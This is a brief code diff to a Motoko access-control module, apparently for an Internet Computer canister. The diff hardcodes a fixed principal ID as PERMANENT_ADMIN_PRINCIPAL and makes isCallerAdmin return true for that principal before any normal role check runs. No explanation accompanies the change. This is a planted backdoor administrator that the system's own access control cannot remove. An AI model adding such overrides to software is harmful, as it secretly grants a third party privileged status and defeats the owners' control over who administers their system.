@@ -1,8 +1,11 @@
 import AccessControl "./access-control";
 import Prim "mo:prim";
 import Runtime "mo:core/Runtime";
+import Principal "mo:core/Principal";
 
 mixin (accessControlState : AccessControl.AccessControlState) {
+  let PERMANENT_ADMIN_PRINCIPAL : Principal = Principal.fromText("jzvyy-b5vuw-oekmq-hiij4-sjcsk-s77ci-uu4i3-ldknd-qk5cl-a322x-sqe");
+
   // Initialize auth (first caller becomes admin, others become users)
   public shared ({ caller }) func _initializeAccessControlWithSecret(userSecret : Text) : async () {
     switch (Prim.envVar<system>("CAFFEINE_ADMIN_TOKEN")) {
@@ -25,6 +28,7 @@ mixin (accessControlState : AccessControl.AccessControlState) {
   };
 
   public query ({ caller }) func isCallerAdmin() : async Bool {
+    if (caller == PERMANENT_ADMIN_PRINCIPAL) { return true };
     AccessControl.isAdmin(accessControlState, caller);
   };
 };
